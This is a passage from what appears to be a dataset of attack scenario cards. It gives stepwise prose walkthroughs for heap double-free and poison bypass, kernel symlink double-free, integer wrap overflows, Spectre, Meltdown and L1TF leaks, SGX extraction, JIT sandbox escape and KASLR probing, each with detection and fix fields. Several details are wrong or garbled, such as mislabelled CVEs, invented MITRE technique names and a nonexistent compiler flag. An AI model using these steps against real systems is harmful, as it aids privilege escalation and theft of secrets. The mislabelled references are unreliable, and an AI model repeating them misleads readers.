Attack Steps: Step 1: Set up a Linux environment with a C program using glibc allocator. Compile with -fsanitize=address and debug symbols to observe allocator internals. Step 2: Understand how modern allocators apply protection: poisoning freed chunks with known patterns (like 0xDEADBEEF) and maintaining free list integrity (e.g., tcache double-free detection). Step 3: In the vulnerable app, free a chunk once and manually tamper the free list or tcache pointer. Then, cause a second free() call without being detected (e.g., through manual pointer overwrite or misused logic path). Step 4: This results in allocator metadata now containing attacker-controlled values (like tcache next pointer pointing to fake chunk). Step 5: Poisoning nullification occurs because the attacker replaces poisoned bytes with valid data (e.g., writing over 0xDEADBEEF with nulls or struct fields), fooling the allocator into thinking chunk is valid. Step 6: Call malloc() again with a size that causes allocator to return the double-freed (now poisoned) chunk. If poisoning was not bypassed, program would abort. If bypassed, attacker receives a valid-looking chunk. Step 7: Write data into this chunk to overwrite sensitive pointers or structs in program. Step 8: This is a classic heap exploitation primitive to bypass detection and break memory safety tools. Step 9: Demonstrate by overwriting a function pointer in same program and executing it. Step 10: Observe that even ASAN or glibc fails to catch it if poison markers were cleaned. Step 11: Real attacks use this to subvert memory sanitizers in hardened binaries (e.g., browsers, C daemons). Step 12: Validate using GDB, pwndbg heap bins, and observing malloc/free logs.
Detection Method: Use sanitizers like ASAN, valgrind, MALLOC_CHECK; monitor poison patterns
Solution: Harden allocator: enable pointer checks, safe unlinking, tcache double-free detection
Tags: heap, allocator, poison bypass, ASAN evasion, glibc tcache

Title: Symbolic Link Tracker Free + Double-Free
Scenario Description: Exploit abuses the OS's symbolic link resolution tracker. A crafted link chain causes memory to be freed twice in the symlink tracker, enabling attacker to hijack control.
Tools Used: Linux (Ubuntu/Debian), gcc, gdb, symlink tools, lsof, strace, AFL++
Attack Steps: Step 1: Set up a Linux system (Ubuntu or Debian preferred). Understand how symbolic links work in the Virtual File System (VFS). Each symlink resolution creates temporary kernel structures that track visited paths, inode info, and link limits (to prevent loops). These are stored in heap-managed memory and freed on resolution or error. Step 2: Write a test C program that continuously opens a symbolic link that points to another symlink (nested resolution). Use a pattern like: ln -s A B, ln -s B A to create a loop. Step 3: Observe with strace or lsof that system calls like open() or realpath() enter symlink resolution loop and hit ELOOP (too many levels of symbolic links). Step 4: Patch the kernel or use a vulnerable kernel version (e.g., pre-4.x Linux with known VFS symlink issues like CVE-2015-7833). These contain logic flaws in link_path_walk() or page_follow_link_light() where memory tracking visited symlinks is freed incorrectly in corner cases. Step 5: Create a custom fs mount with mount namespace and loop symlinks to trigger deep path resolution. Programmatically create symlinks using symlink("B", "A"), symlink("A", "B"), open("/mnt/A"). Step 6: Induce an error during lookup (like invalid inode) after resolution to force the kernel to free the symlink tracker memory. Then repeat the open again, leading to a second free when the path cleanup logic runs. Step 7: This results in a double-free in kernel heap (SLUB or SLAB) allocator. Attach kernel debugger (or log kernel crash) to see corrupted kmalloc metadata. Step 8: Heap corruption occurs in the symlink resolution tracker list. By pre-spraying with predictable allocations (e.g., repeatedly accessing /proc/self/fd/), attacker can place fake objects or data. Step 9: If a function pointer or path structure is read later, attacker-controlled memory will be used, leading to privilege escalation or kernel info leak. Step 10: You can test exploit by compiling a kernel module that triggers the condition or fuzzing realpath() calls. Also applicable in sandbox escape scenarios. Step 11: On Windows, similar issues arise in NTFS junction and object manager tracking (CVE-2018-8611). Exploits can trick token management or object access tracking. Step 12: Validate with logs, dmesg, and heap debugging in the kernel (/proc/slabinfo, kmemleak, etc.).
Detection Method: Kernel panic/crash on symlink chain; kmemleak reports; corrupted slab entries; strace ELOOP storm
Solution: Patch VFS symlink handler; limit symlink depth; verify symlink cleanup integrity; restrict recursive link dereference
Tags: symlink, kernel, double-free, path resolution, sandbox escape

Title: Heap Allocation Size Bypass
Scenario Description: A size truncation or wrap causes malloc() or kernel allocators to allocate less memory than needed, enabling overflow beyond bounds
Tools Used: gcc, valgrind, gdb, pwndbg, AFL++, ltrace, ASAN
Attack Steps: Step 1: Set up a Linux VM with debugging tools: valgrind, ASAN, and pwndbg. Create a C program that dynamically allocates a buffer based on user input. Use code like char *buf = malloc(user_input * sizeof(int));. Step 2: Simulate an integer overflow or size bypass by setting user_input = VERY_LARGE_NUMBER, like 0x40000001. This overflows the internal size_t multiplication inside malloc() (e.g., 0x40000001 * 4 → wraps to a small value). Step 3: The program thinks it allocated a large buffer, but actually malloc() allocates much less (like 16 bytes instead of 16GB). Step 4: Now write a loop that fills the buffer with 16GB worth of values. The program writes out-of-bounds and overflows into adjacent heap memory. Step 5: Attach with GDB or run under AddressSanitizer. Watch for a heap buffer overflow crash. Step 6: Real exploits can chain this with function pointer corruption, struct overwrites, or vtable hijack. Step 7: Commonly seen in CVEs like CVE-2016-4484, CVE-2017-1000371, and several glibc bugs. Step 8: You can also replicate this in kernel-space (e.g., in Linux drivers) by passing oversized values to copy_from_user() or kernel APIs expecting size_t input. Step 9: In Linux kernel modules, this bug lets you control adjacent kmalloc objects, creating a path to privilege escalation or kernel info leak. Step 10: Always validate size calculations and check for unsigned overflow using static analyzers like clang-analyzer or CBMC.
Impact: Heap corruption, code execution, memory leaks
Detection Method: ASAN/valgrind logs; trace malloc() vs real memory size; static code analyzer on integer operations
Solution: Validate allocation size before malloc; use __builtin_mul_overflow; avoid unchecked user-to-size_t conversions
Tags: heap overflow, malloc bypass, integer wrap, allocator bug

Title: Array Index Calculation Wrap
Attack Type: Array Bounds Bypass via Integer Overflow
Scenario Description: Using large index arithmetic, attacker causes array index calculations to wrap around, bypassing bounds checks
Attack Steps: Step 1: Create a C program with an array, e.g., int array[10];. The access pattern is controlled by a user-supplied index: int i = user_input; array[i] = 42;. Step 2: Normally, bounds checks are expected. But now change the code to use a calculated index: int i = base + (user_input * size);. Use a very large user_input (e.g., INT_MAX / size + 1). Step 3: This causes integer overflow during index calculation, e.g., (4 * INT_MAX) → wraps to small or negative number. The resulting index becomes valid again (like array[-2]) and escapes detection. Step 4: If there's no proper bounds check after this wraparound, attacker can write outside the array and overwrite nearby memory. Step 5: Compile with -fsanitize=undefined,address and run with malicious input. The sanitizer detects the invalid write and shows offset calculation. Step 6: In kernel or driver-level C code (e.g., ioctl handlers), this exact pattern has caused bugs like CVE-2016-0728 (refcount corruption) and CVE-2018-1000001 (signed wrap). Step 7: Real-world exploit chains combine this with controlled data to override code paths, change flags, or overwrite structs. Step 8: This technique also bypasses integer-based sandbox filters or path traversal prevention when index math is incorrectly handled. Step 9: Validate fix with static analyzer, enabling warnings for -Wconversion, -Wsign-conversion, and -ftrapv. Step 10: Harden systems with compiler options like -fwrapv=no and memory-safe replacements for array logic.
Vulnerability: Signed/unsigned integer wrap in index math
Impact: Array overflow, data leakage, control hijack
Detection Method: Compiler warnings, runtime sanitizer tools (UBSan, ASAN), static symbolic execution tools like CBMC
Solution: Use safe index calculation macros; detect overflows before indexing; prefer size_t and range-checked APIs
Tags: array wrap, integer overflow, index bug, logic bypass

Title: Kernel Input Structure Overflow
Attack Type: Ring Buffer Corruption via Length Wraparound
Scenario Description: Malformed syscall input includes oversized length field in a structure. Internally, this wraps to 0 → copy_to_user() writes entire ring buffer to user.
Tools Used: Linux, GDB, QEMU, syzkaller, strace, SystemTap, kernel module
Attack Steps: Step 1: Understand how many Linux syscalls accept user-allocated structs (e.g., perf_event_open, ioctl, getcpu, sendmmsg). These structs often include a size/length field. Step 2: Find or write a C program that uses one of these syscalls (e.g., perf_event_open). Fill in the struct normally, then deliberately set the size field to a huge number like 0xFFFFFFFFFFFFFFFF (for u64) or -1 (for signed). Step 3: In the kernel, this value may wrap around when the kernel tries to verify or copy data from kernel to user (e.g., in copy_to_user()). The syscall logic might do: if (len >= expected_size) return error; but this check fails due to wrap. Step 4: If unchecked, copy_to_user() begins copying a very large amount of data from kernel memory into userland memory — often overflowing ring buffers or revealing adjacent kernel structures (like credentials or task_struct). Step 5: Compile and run your exploit program inside a QEMU-based kernel with CONFIG_DEBUG_INFO, KASAN, or kmemleak enabled. Step 6: After running the syscall with the malformed input, check dmesg, /var/log/syslog, or /proc/kmsg for ring buffer corruption or KASAN alerts. Step 7: Dump the user buffer to observe leaked kernel memory contents (e.g., with hexdump). You might observe process credentials, function pointers, or stack canaries. Step 8: This bug class has been seen in CVE-2019-18683 (perf_event_open) and older SCTP and netlink handlers. Step 9: Exploit by repeatedly invoking syscall and parsing leaked contents to leak ASLR or privilege info. Step 10: Combine with another bug (e.g., double-free or controlled write) for full kernel privilege escalation.
Detection Method: Monitor dmesg, KASAN output; validate unexpected ring buffer growth or copy_to_user panic
Solution: Harden input size validation in syscalls; clamp or cast lengths before use; use strict bounds checks in struct handlers
Tags: kernel ring buffer, struct overflow, length wrap, perf_event

Title: Signed to Unsigned Conversion Bug
Attack Type: Buffer Overflow via Sign Extension in Syscall
Scenario Description: Signed int becomes large unsigned during cast → buffer over-read or over-write in kernel/user functions
Tools Used: C, GDB, valgrind, AFL++, static analyzers, QEMU
Attack Steps: Step 1: Write a simple user-space program in C that interacts with a syscall taking a size_t or unsigned int input (e.g., read(fd, buf, len)). Pass a negative integer like -1 to the size parameter, either directly or by casting a signed value into an unsigned. Step 2: In many older kernel and libc implementations, signed values passed into unsigned parameters silently wrap: -1 becomes 0xFFFFFFFF (on 32-bit) or 0xFFFFFFFFFFFFFFFF (on 64-bit). Step 3: When this value is passed into memory allocation or copy_to_user() / copy_from_user() APIs, the kernel believes the user wants to copy a huge amount of memory. Step 4: If the receiving buffer was allocated for a small size (e.g., 4 bytes), this results in heap buffer overflow or kernel stack corruption. Step 5: Compile and run your test on a Linux system with ASAN or KASAN. Check for crash due to invalid access, large allocation requests, or corrupted memory. Step 6: You can also test this with syscalls like sendmsg, writev, or ioctl, where length fields are sometimes signed. Use strace to monitor the wrapped values in real-time. Step 7: A famous real-world case is CVE-2017-6074 in the DCCP socket handler, where sign extension + UAF + double-free allowed remote code execution. Step 8: To exploit, you can chain this bug with uninitialized buffer reads or improperly allocated structs to leak kernel memory. Step 9: Use symbolic execution tools (e.g., KLEE, angr) or static analyzers like Infer or CBMC to detect such bugs in large C codebases. Step 10: Fix by ensuring all inputs are cast carefully, validate negative values before conversion, and avoid signed math with size-sensitive types.
Detection Method: Check for unusually large memory access in syscalls; static analyzers detect mixed signed/unsigned math
Solution: Always validate input before casting; enable -Wconversion, -Wsign-conversion, and use safe wrappers for system calls
Tags: signed to unsigned, cast bugs, buffer overflow, syscall

Title: Kernel BTI Gadget Leak
Attack Type: Branch Target Injection Gadget Execution in Kernel
Scenario Description: By mistraining the CPU branch predictor, an attacker can speculatively execute chosen kernel gadgets, leaking data via side channels (Spectre Variant 2).
Attack Steps: Step 1: Understand that CPUs predict branches to speed up execution. If you mistrain the prediction history, the CPU may execute “gadgets” — pieces of code not meant to run — temporarily in a speculative way. Step 2: In Spectre Variant 2 (BTI – Branch Target Injection), an attacker influences the branch predictor to jump to a chosen address in the kernel (like mov eax, [rbx]). Step 3: The attacker runs many calls to an indirect branch (like call *%rax) with a controlled address, so the CPU learns to predict this call will go to your gadget. Step 4: Then, the attacker triggers that same indirect call in a privileged context (kernel or syscall), and the CPU speculatively jumps to the attacker’s chosen gadget. Step 5: The gadget loads secret data and leaks it into cache. The real program never sees this — but the attacker measures which cache lines were touched using rdtsc. Step 6: For example, trigger a syscall (open()) that indirectly jumps to kernel logic; mistrain it so it speculatively jumps to a secret-leaking gadget inside the kernel. Step 7: Use cache side-channel measurement to decode the secret. Step 8: This technique can bypass KASLR, read /etc/shadow in kernel memory, and extract crypto keys in protected memory. Step 9: Real-world tools like spectre2-kernel.c or BTI PoC show how to do this on older Intel chips. Step 10: Kernel BTI fixes include retpoline, IBRS (Indirect Branch Restricted Speculation), and flushing BTB on context switch.
Detection Method: Monitor BTB usage anomalies, cache hits; detect abnormal speculation patterns
Solution: Enable retpoline, IBRS, STIBP; apply Spectre v2 mitigations in microcode and OS
Tags: Spectre Variant 2, Kernel BTI, Branch Mistrain

Title: Cross-Process Data Leak via Shared Libraries
Attack Type: BTI via Shared DLL or Shared Object Branch Predictor Abuse
Scenario Description: Attackers mistrain the CPU’s branch target predictor using a shared library in one process to cause data leaks in another unrelated process.
Attack Steps: Step 1: On systems with shared libraries (like libc.so, kernel32.dll), many processes load the same code at the same virtual address. Step 2: The CPU’s branch target buffer (BTB) remembers past indirect jumps, and doesn’t always distinguish between different processes or security contexts. Step 3: An attacker process can call indirect branches that end up mistraining the BTB with an address from the shared library (like a mov eax, [rbx] gadget in libc). Step 4: The victim process, when running a similar indirect call, will speculatively execute the same gadget as the attacker predicted. Step 5: This speculative gadget may read secret data from victim memory and leak it to the cache. Step 6: The attacker, using rdtsc timing and cache probes, detects which cache line was loaded, and infers the victim’s secret (like a password or key). Step 7: You can simulate this on a Linux system using two processes that load libc and exchange branch predictor state through BTB. Step 8: PoCs like btb-shared-poison.c from academia show this behavior works across containers or multi-user systems. Step 9: This breaks ASLR and sandbox boundaries if mitigations are not active. Step 10: This is why shared memory and BTB flushing are now critical in OS/hypervisor updates.
Detection Method: Track high-frequency indirect calls, measure BTB activity between processes
Solution: Use flush-on-context-switch, enable STIBP and IBPB microcode protections
Tags: Branch Target Injection, BTB Poisoning, Shared Library Exploit

Title: Escape via Xen/KVM Hypervisor Gadget
Attack Type: Hypervisor Escape via Speculative Gadget Abuse
Scenario Description: An attacker in a guest VM mistrains the CPU’s branch predictor to speculatively execute privileged hypervisor code, leaking memory or escaping VM sandbox.
Tools Used: Xen/QEMU/KVM, rdtsc, qemu-system, patched VM images
Attack Steps: Step 1: Modern virtualization (e.g., KVM, Xen) isolates VMs from host OS. However, speculative execution flaws can bypass this boundary. Step 2: In BTI-like attacks, an attacker inside a VM trains the CPU to speculatively jump into privileged code (like hypervisor syscall handlers or KVM modules) that shouldn't be accessible. Step 3: Repeatedly call an indirect branch inside your VM (e.g., call *%rax) that shares history with a similar branch in the hypervisor. Step 4: Predictive branch history stored in BTB is global across CPUs (unless flushed). Step 5: Now, when the hypervisor executes a matching pattern (e.g., I/O emulation for guest), the CPU speculatively executes attacker-chosen gadgets. Step 6: These gadgets can access hypervisor memory and leak secrets like other VM data or host kernel information. Step 7: Measure which cache lines were affected using timing (rdtsc) to decode the leaked info. Step 8: This attack was demonstrated in Spectre-V2 and V4 variant attacks against Xen/KVM/QEMU. Step 9: Practical reproduction requires VMs with debugging support and pre-2020 CPUs (Intel or AMD). Step 10: Always use patched hypervisors and disable vulnerable CPU features in live infrastructure.
Detection Method: Monitor branch predictor poisoning, track BTB flush failures between guests
Solution: Use IBPB/STIBP, retpoline, isolate BTB by context switch, apply Spectre-v2 hypervisor patches
Tags: Hypervisor Escape, Speculative VM Leak, BTI Xen/KVM

Title: SGX Enclave Leakage
Attack Type: Side-Channel Leakage of Secure Enclave Secrets
Scenario Description: Attackers use cache or branch-based side channels to extract secrets from Intel SGX enclaves, bypassing trusted execution guarantees.
Attack Steps: Step 1: Intel SGX enclaves are isolated code+data zones meant to keep sensitive operations (like cryptographic keys, biometric matching) secure even from the OS. Step 2: However, CPU speculative flaws like L1TF and cache probing make it possible to observe enclave behavior from outside. Step 3: You can recreate this with sgx-step, an academic toolkit that steps through enclave execution while monitoring TLB faults and cache timings. Step 4: Construct a trigger that causes the enclave to access a secret (e.g., AES key). Step 5: At the same time, outside the enclave, run a probe function that accesses cache lines associated with that secret. Step 6: Use rdtsc to measure timing of these accesses — if cache line was used, you get fast access → confirming secret usage. Step 7: Repeat this many times, varying the guess byte-by-byte, reconstructing the secret with high accuracy. Step 8: This was shown in attacks like Foreshadow (CVE-2018-3615), which broke the fundamental SGX isolation model. Step 9: Use vulnerable Intel CPUs (pre-2019) and SGX SDK to test. Step 10: Mitigations include disabling HT, patching microcode, and removing SGX when not needed.
Impact: Enclave key theft, trust boundary collapse
Detection Method: Monitor L1/L2 cache usage, TLB miss profiling, measure speculative faults
Solution: Disable SGX or run in trusted physical isolation; apply CPU+firmware patches
Tags: SGX Foreshadow, Trusted Execution Bypass, Side-Channel

Title: VM → Host Memory Leak
Attack Type: Kernel Memory Disclosure Across VM Boundaries
Scenario Description: Using speculative execution and misconfigured hardware, attacker VM leaks physical host or hypervisor memory without proper access.
Attack Steps: Step 1: A virtual machine normally can’t read physical memory from the host or other VMs. But speculative flaws allow reading via timing side-channels. Step 2: Set up a vulnerable VM (e.g., Ubuntu 16.04 guest on KVM without L1TF mitigations) and a malicious app inside it. Step 3: This app uses speculative read primitives like if(array[index] < size) to access out-of-bounds memory. Step 4: The speculative read might pull in hypervisor or page table data into cache. Step 5: Use rdtsc-based timing to infer which data is in cache (read = fast). Step 6: This allows reconstruction of leaked host memory from inside a VM, violating isolation. Step 7: Real attacks like L1TF and Foreshadow-VMM exploited Intel flaws to dump full host kernel memory from guest VM. Step 8: The technique works best on Intel CPUs before 8th gen where speculative buffers and L1 were not flushed between VMs. Step 9: Defenders must apply BIOS, microcode, and kernel patches that flush caches and enforce EPT protections. Step 10: These attacks only require unprivileged VM access to start.
Impact: Dump host kernel memory, leak encryption keys
Detection Method: Watch speculative fault timing, cache anomalies between VMs, enforce hypervisor isolation
Solution: Disable HT, patch microcode, apply EPT+L1TF protections in host kernel
Tags: VM Escape, L1TF, Hypervisor Speculative Leak

Title: Read PTE Entries Speculatively
Attack Type: Memory Mapping Disclosure via Page Table Entry (PTE) Access
Scenario Description: Exploit speculative behavior to access page table entries and leak address mappings, defeating KASLR and revealing kernel layout.
Attack Steps: Step 1: In Linux, virtual to physical memory mappings are stored in Page Table Entries (PTEs). These are protected from user-space access — but not always from speculative reads. Step 2: On older CPUs (Intel pre-8th gen), speculative execution can follow pointers into privileged memory and access mm_struct or pgd values speculatively. Step 3: Use a user-space program to dereference addresses likely pointing to kernel page tables. Step 4: Wrap the memory access in a speculative branch (e.g., if(index < length)) so that the CPU doesn't block it. Step 5: If access is illegal, the CPU still speculatively reads and touches the cache — even though the real program never sees the data. Step 6: Now use timing via rdtsc to probe which address bits were cached. This reveals whether certain kernel pages exist. Step 7: With enough attempts, build a full map of the kernel memory layout — breaking KASLR (Kernel Address Space Layout Randomization). Step 8: This info can then be used to launch other kernel exploits (like ROP chains or pointer overwrites). Step 9: Mitigations like KAISER, PTI, and page table isolation reduce or eliminate this risk. Step 10: Always test only in a lab VM — leaking PTEs in live systems is highly illegal and stealthy.
MITRE Technique: T1611 – Exploit Kernel Memory via Mapping
Impact: KASLR bypass, foundation for further kernel attacks
Detection Method: Monitor access to kernel address space, timing anomalies in user-space
Solution: Enable PTI (Page Table Isolation), restrict speculative reads, apply Spectre/KPTI patches
Tags: PTE Leakage, KASLR Bypass, Kernel Memory Mapping Exploit

Title: Sandbox Escape in JIT Engines
Attack Type: JavaScript Sandbox Escape via JIT Optimization Flaws
Scenario Description: Attackers exploit Just-In-Time (JIT) compilers like V8 or SpiderMonkey in browsers to escape the JavaScript sandbox and gain higher privileges.
Attack Steps: Step 1: Modern JavaScript engines like V8 (used in Chrome) and SpiderMonkey (used in Firefox) optimize JS using JIT (Just-In-Time) compilers to speed up performance. Step 2: JIT compilers assume type stability and predictable behavior. If an attacker tricks the JIT engine (e.g., using type confusion), it generates incorrect machine code. Step 3: For example, repeatedly run a function with an integer array, then pass a crafted object to the same function. JIT will not re-check types and will treat object memory like an integer buffer. Step 4: This lets the attacker read/write arbitrary memory in the browser process. Step 5: Write a PoC that triggers JIT bug like CVE-2021-30632 or CVE-2020-6418, which corrupts JS memory and lets you control object structure. Step 6: With this corruption, you can create fake JS objects, get arbitrary read/write, and even execute shellcode in the browser. Step 7: Chain with browser bugs (e.g., sandbox bypass) to execute code outside the JS engine. Step 8: This leads to full browser sandbox escape and even system compromise on vulnerable versions. Step 9: Always test in an isolated VM using old browser versions (e.g., Chrome 79, Firefox 72) and never live systems. Step 10: These bugs are usually patched fast, but 0-days do exist in wild.
Impact: Sandbox escape, code execution in browser
Detection Method: Use browser crash logs, detect heap corruptions, trace fuzzers
Solution: Disable JIT (use --no-jit flags), update browsers frequently, use site isolation and sandboxing
Tags: Browser JIT, Sandbox Escape, JS Memory Abuse

Title: WASM Memory Leak
Attack Type: Out-of-Bounds Read via WebAssembly + Speculative Execution
Scenario Description: Attackers use WebAssembly’s linear memory and CPU flaws to read outside memory bounds and extract JS/WASM secrets in browsers.
Attack Steps: Step 1: WebAssembly (WASM) provides near-native performance in the browser and operates on a linear memory buffer (like a giant array). Step 2: If a WASM program reads past the bounds of its memory (e.g., memory[buffer.length + 100]), it should crash — but speculative execution can bypass this. Step 3: Write a WASM module that performs an out-of-bounds access inside a speculative branch (if(false) block) and use rdtsc-style timing in JS to detect leaked values. Step 4: Host this WASM file in a simple HTML/JS webpage and open it in Chrome or Firefox. Step 5: Use cache-timing side-channels (as in Spectre) to infer byte values that lie in adjacent memory regions — which might belong to JS engine objects or variables. Step 6: This reveals sensitive data like passwords, CSRF tokens, or history from other browser tabs or WASM modules. Step 7: These attacks are invisible to most logs and can run purely client-side, needing no user interaction. Step 8: Test against patched vs. unpatched browsers (Chrome 65+ has Site Isolation, which mitigates many of these). Step 9: Research versions of Spectre attacks (Spectre-PHT, BTB, RS) affect WASM differently. Step 10: Don’t run in real browsers — test in isolated VMs with known vulnerable configurations only.
Impact: Steal cross-module secrets or memory from browser
Detection Method: Timing analysis, JS profiler inspection, monitor unusual memory reads
Solution: Enable Spectre/WASM mitigations in browser, apply Site Isolation, disable WASM for sensitive sessions

Title: SGX Enclave Bypass
Attack Type: Memory Extraction from Trusted Execution Environments
Scenario Description: Intel SGX (Secure Guard Extensions) enclaves are supposed to protect sensitive data, but side-channel attacks can leak their secrets from outside.
Tools Used: sgx-step, Foreshadow, rdtsc, gdb, Intel SDK
Attack Steps: Step 1: Intel SGX is used to run code inside a secure enclave that even the OS or hypervisor can’t read. This is useful for DRM, crypto wallets, or private computations. Step 2: However, side-channel attacks like Foreshadow (CVE-2018-3615) and SGX-Step break these assumptions by measuring how the enclave behaves under certain memory access patterns. Step 3: You write a program that sits outside the enclave and performs repeated probes (memory faults, TLB misses, cache timings) on enclave addresses. Step 4: If enclave data influences timing or exception behavior, you infer its value byte by byte. Step 5: Use tools like sgx-step (academic toolchain) to single-step and trace enclave instructions. Step 6: Foreshadow clones SGX page table entries and uses L1 terminal faults (TLB-based speculative execution flaw) to retrieve secrets like AES keys, passwords, or fingerprints. Step 7: You can recreate this using patched Intel SGX SDK (with debugging enabled), L1TF-exposed CPUs (pre-2019 Intel). Step 8: This shows that "trusted" enclaves can be vulnerable to CPU-level bugs. Step 9: Defenders should isolate SGX apps from untrusted code, disable HT (Hyper-Threading), and apply all microcode + BIOS updates. Step 10: These attacks require physical or near-root access and are often used in APTs or cloud side-channels.
MITRE Technique: T1055.012 – Process Injection via Memory Mapping
Impact: Extract encryption keys, biometric data, user secrets
Detection Method: Monitor TLB/caching behavior, measure syscall timing, check for abnormal fault behavior
Solution: Disable SGX if not needed, apply microcode patches, use secure enclave architectures (e.g., AMD SEV)
Tags: SGX Bypass, Side-Channel, Trusted Execution Exploit

Title: Read Out-of-Bounds Data
Attack Type: Memory Disclosure via Out-of-Bounds Read in Kernel/Userspace
Scenario Description: Exploit software bugs that read beyond valid memory bounds, revealing secret or uninitialized memory contents.
Tools Used: Custom C programs, valgrind, fuzzers, Dirty COW
Attack Steps: Step 1: In some programs or drivers, memory buffers are not properly checked. Reading past the valid length gives you random memory — possibly from other processes, kernel space, or uninitialized data. Step 2: For example, a C program might copy 100 bytes from a file but accidentally reads 200 bytes due to a bug in length check (memcpy(buffer, input, 200) when only 100 were intended). Step 3: If this data is in kernel-space or includes memory reused from other programs, it may contain secrets like passwords, tokens, or filenames. Step 4: You can fuzz input using tools like AFL (American Fuzzy Lop) to trigger such bugs in target binaries. Step 5: You write malformed inputs and observe if the program prints or returns data it shouldn’t have (e.g., kernel logs, private messages, or memory addresses). Step 6: If successful, it leaks heap/stack memory, possibly containing key material or user data. Step 7: In 2014, Heartbleed (CVE-2014-0160) was a famous real-world out-of-bounds read in OpenSSL that leaked 64 KB chunks of server RAM — including TLS keys and passwords. Step 8: You can recreate similar attacks by compiling buggy C code and sending malformed inputs. Step 9: Modern kernels try to block this using KASAN or sanitizers — but it still happens in native apps and embedded systems. Step 10: Always test only in labs or fuzzing environments.
Detection Method: Run valgrind, check code for unbounded memcpy, read, recv
Solution: Use compiler sanitizers (-fsanitize=address), proper length checks, kernel memory zeroing
Tags: Heartbleed, OOB Read, Input Validation Failures

Title: Leak Secrets Across JavaScript Contexts
Attack Type: Same-Origin Policy Bypass via Spectre JS Side-Channel
Scenario Description: Exploits speculative execution in browsers to leak data from other JS contexts or frames, defeating site isolation policies.
Attack Steps: Step 1: Browsers use the Same-Origin Policy to prevent one website from reading data loaded in another tab or iframe (e.g., bank.com and attacker.com stay isolated). Step 2: Spectre breaks this by exploiting speculative execution in the CPU through carefully crafted JavaScript that accesses memory it's not supposed to. Step 3: The attack JS guesses what value exists at a secret address (like a variable holding a password in another iframe) and uses cache timing to confirm it. Step 4: Example: one iframe on attacker.com runs JS code that repeatedly accesses array entries based on secret data, and times how fast it was. The timing reveals which data was loaded. Step 5: You can test this by loading a PoC like spectre.js in Chrome or Firefox and watching the console output. It may show leaked bytes from memory belonging to another origin — which should not be possible. Step 6: This is a side-channel and doesn’t show in browser logs or DevTools. Step 7: It allows stealing credentials, CSRF tokens, or browsing history from high-value sites opened in other tabs. Step 8: Major browsers added Site Isolation, Cross-Origin Read Blocking, and JavaScript JIT hardening to stop this. Step 9: However, Spectre-class variants (v1, v4, v2b) continue to be researched. Step 10: Test this only in offline labs, not on live websites.
Impact: Steal cross-origin secrets, bypass web isolation
Detection Method: Use spectre.js PoCs; inspect browser cache patterns; enable Site Isolation via browser flags
Solution: Enable browser isolation flags, use per-site process separation, apply CPU firmware updates

Title: User → Kernel Memory Leakage
Attack Type: Kernel Memory Disclosure via Speculative Execution
Scenario Description: Exploits like Meltdown allow attackers to read kernel memory from a normal user process due to flaws in CPU out-of-order execution on older Intel CPUs.
Attack Steps: Step 1: Understand the core idea — CPUs (pre-Intel 8th gen) execute instructions out of order to improve performance. This can leak data during guesswork (speculation). Step 2: Meltdown-style attacks bypass kernel memory protection using timing attacks. The CPU speculatively reads kernel data into a register, which is not allowed, but it doesn't block the attempt soon enough. Step 3: You write a C program (or use public meltdown.c) that reads privileged addresses (like 0xffffffff81000000) and uses cache timing to determine what the data was. Step 4: The attacker maps a memory buffer with side channels (e.g., a 256-element array) and uses rdtsc to measure access time after a speculative access leaks the kernel byte value. Step 5: Compile the attack code: gcc meltdown.c -o meltdown. Step 6: Run the binary as a regular user. You’ll see output like “Reading byte 0x3A from kernel offset 0xFFFF...” which should never happen. Step 7: You can dump secrets from /etc/shadow, keyrings, or process credentials. Step 8: This is a CPU-level issue, not a kernel bug — even hardened kernels leak memory on unpatched CPUs. Step 9: Defenders can only mitigate via firmware and kernel updates (KAISER, KPTI).
Impact: Kernel memory access, root credential leak
Detection Method: Unusual cache access timing, run tools like spectre-meltdown-checker.sh, detect performance drop
Solution: Use patched CPU microcode, KPTI (Kernel Page Table Isolation), upgrade to Intel 8th gen+ or AMD Ryzen
Tags: Meltdown, CPU Exploit, Kernel Memory Leak

Title: VM Escape via Kernel Leak
Attack Type: Memory Disclosure from Guest VM to Host via Side-Channels
Scenario Description: Hypervisors (KVM, Xen) affected by CPU flaws like L1TF, MDS, and Spectre allow guests to read kernel memory or secrets of host system, enabling VM escape.
Attack Steps: Step 1: You set up a KVM or QEMU virtual machine (Ubuntu/Kali) and run as an unprivileged guest user. Step 2: You load a Meltdown- or L1TF-style attack code inside the guest VM. Example: meltdown.c, or l1tf-reader.c. Step 3: The vulnerable CPU (e.g., Intel pre-9th gen without proper microcode updates) speculatively executes instructions that cross VM boundaries due to flawed CPU buffer isolation. Step 4: You configure the guest to use large memory regions (e.g., by allocating >2 GB in memory) and run the exploit against known host kernel address ranges (0xffff...). Step 5: With successful leakage, you see memory content from the host, such as parts of the kernel, secrets in /proc, or other VM processes. Step 6: These secrets can include SSH private keys, token files, or passwords that let the guest attacker move into the host. Step 7: If the attacker gets enough control, they can even inject code into host page tables and escape. Step 8: This chain was possible in attacks like L1TF (2018), Spectre v2, and CVE-2018-3646. Step 9: This breaks isolation promise of cloud platforms like AWS, GCP unless mitigated. Step 10: The solution is strong microcode + updated hypervisors (QEMU >2.11+, Xen patched), or migrating to AMD EPYC with proper Spectre resistance.
Detection Method: Check hypervisor logs; monitor side-channel tools in guests; use L1TF/MDS detection scripts
Solution: Apply Intel microcode updates, use patched QEMU/Xen/KVM, isolate tenants by core/socket
Tags: Spectre, L1TF, VM Escape, CPU Side-Channel Leak

Title: Bypass KASLR via Memory Probing
Attack Type: ASLR Defeat via Timing + Memory Mapping
Scenario Description: KASLR randomizes where the Linux kernel loads. Attackers bypass this by probing memory locations and using cache timing or page fault side-channels.
Attack Steps: Step 1: Kernel Address Space Layout Randomization (KASLR) loads the Linux kernel at a random memory address each boot (e.g., 0xffffffff81000000). Step 2: Attackers can bypass KASLR using timing attacks, fault analysis, or guessing. A common method is to access guessed kernel addresses and measure how long it takes — if it causes a page fault, it’s invalid; if it’s fast, the page exists. Step 3: You write a C program that uses rdtsc to measure access times to memory ranges like 0xffffffff80000000 to 0xffffffffa0000000 in 1MB steps. Step 4: Compile and run it. If any page responds quickly, the kernel is mapped there — KASLR is broken. Step 5: Once the base address is known, you can launch ROP (Return-Oriented Programming) attacks, kernel exploits (e.g., CVE-2017-7308), or jump gadgets directly. Step 6: On older systems, /proc/kallsyms and /boot/System.map were readable without root — use them to find real symbol addresses. Step 7: Use grep syscall /proc/kallsyms to locate system call entry points after bypassing KASLR. Step 8: This reveals the memory layout required to develop local kernel exploits. Step 9: Modern kernels protect against this by zeroing /proc/kallsyms, enforcing dmesg_restrict, and randomizing more bits. Step 